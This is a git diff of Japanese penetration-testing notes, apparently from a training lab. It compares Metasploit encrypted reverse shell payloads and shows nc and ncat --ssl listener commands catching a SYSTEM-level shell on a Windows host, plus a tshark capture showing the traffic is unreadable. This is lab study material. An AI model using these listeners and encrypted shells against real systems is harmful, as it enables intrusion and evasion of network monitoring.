@@ -2105,12 +2105,55 @@ nt authority\system
 
 C:\Windows\system32> 
 ```
+
 ### windows/x64/encrypted_shell_reverse_tcp
-ncではうまく通信できない
+シェルコマンド自体が暗号化されているかんじ？
 ```
+└─$ rlwrap nc -lnvp 5555
+listening on [any] 5555 ...
 0964ffb7f82bc0ac
 �G�ZB��%q��)�^@n�����\6E'%��4U�O�#U^oY,/
 �G�ZB��%q��)�^@n�����\6E'%��4U�O�#U^oY,/
 �G�ZB��%q��)�^@n�����\6E'%��4U�O�#U^oY,/
                                         7M��i��5��L;�O�r½I��6D��T�O��I�_Γ�*�_g��&R8&R���D�����y�98
+```
+
+###　windows/x64/powershell_reverse_tcp_ssl
+ncでは暗号化通信を扱えない
+```
+└─$ rlwrap nc -lnvp 5555 
+listening on [any] 5555 ...
+connect to [10.10.14.79] from (UNKNOWN) [10.129.230.176] 53540
+��h��T�<=�{�y�n䠎N�3n5/�p*<�,�+�0�/���$�#�(�'�
+�       ��93��=<5/
+j@827
+▒
+#�
+```
+ncatだと暗号化通信を扱える
+```
+└─$ ncat --ssl -lvnp 5555
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: FF1D 11E4 5AD3 7598 A834 E5CE 3E7A 757B 4344 FDE0
+Ncat: Listening on [::]:5555
+Ncat: Listening on 0.0.0.0:5555
+Ncat: Connection from 10.129.230.176:53576.
+Windows PowerShell running as user NETMON$ on NETMON
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+
+PS C:\Windows\system32> whoami
+nt authority\system
+```
+もちろん通信は見えない
+```
+└─$ tshark -i tun0 -f 'tcp port 5555' -Y tls -T fields -e tls.app_data > a.txt
+Capturing on 'tun0'
+2 ^C
+                                                                                                                                                                                                                                            
+
+└─$ xxd -r -p a.txt
+D7�Z����▒��3�SL����,�/��YA�>�   c@P%}2�e���s��g=�hm���
+                                                      s�cx���U[�����7   t�m��/:Kn���$���
 ```
